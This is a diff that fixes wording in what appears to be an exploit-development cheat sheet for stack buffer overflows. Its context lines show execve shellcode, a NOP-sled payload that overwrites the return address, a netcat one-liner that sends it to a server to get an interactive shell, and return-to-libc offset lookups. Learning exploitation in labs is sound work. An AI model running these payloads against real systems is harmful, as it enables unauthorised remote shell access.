@@ -11,7 +11,7 @@ Reliable Linux/x86 (32-bit) shellcode. To find shellcode for your target archite
 ```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
 ```
-Anatomy of a payload for bufferoverflow:
+Anatomy of a payload for buffer overflow:
 
 ```
 Buffer start                                                     Saved EBP              Return address                     Next Return address       Argument list
@@ -26,7 +26,7 @@ gdb ./binary
 b vuln_func
 r < <(python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*111 + "\x90"*4 + "\x80\xa0\x04\x08"')
 ```
-Send the payload to server 10.0.0.1, listening on port 1337. Note the cat command to keeps the netcat sesssion open, granting an interactive shell:
+Send the payload to server 10.0.0.1, listening on port 1337. Note the appended cat command keeps the netcat sesssion open, granting an interactive shell:
 
 ```
 (python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*111 + "\x90"*4 + "\x80\xa0\x04\x08"'; cat) | nc 10.0.0.1 1337
@@ -39,7 +39,7 @@ Assume you the know the address, in memory, at which libc has been loaded and ha
 readelf -s /lib/x86_64-linux-gnu/libc-2.21.so | grep "system"
 ```
 
-To get offset of the "/bin/sh" string:
+To get the offset of the "/bin/sh" string:
 
 ```
 strings -t x /lib/x86_64-linux-gnu/libc-2.21.so | grep "/bin/sh"
